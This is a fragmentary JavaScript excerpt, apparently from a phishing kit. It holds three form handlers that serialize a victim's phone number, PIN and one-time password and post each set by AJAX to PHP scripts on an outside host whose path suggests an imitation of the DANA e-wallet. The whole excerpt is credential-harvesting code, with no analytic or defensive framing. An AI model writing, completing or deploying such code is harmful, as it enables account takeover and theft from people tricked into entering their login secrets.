...
/////
   function sendNohp(event){
    ...
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
			$.ajax( {
			  type: 'POST',
			  url: 'https://directory.ii-im.cyou/holo/dana22/one.php',
			  data: dataString,
...
function sendPin(){
  ...
  var dataString = $("#formNohp, #formPin, #formOtp").serialize();
			$.ajax( {
			  type: 'POST',
			  url: 'https://directory.ii-im.cyou/holo/dana22/two.php',
			  data: dataString,
...
$(".alert").css("color","red");
    ...
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
			$.ajax( {
			  type: 'POST',
			  url: 'https://directory.ii-im.cyou/holo/dana22/three.php',
			  data: dataString,
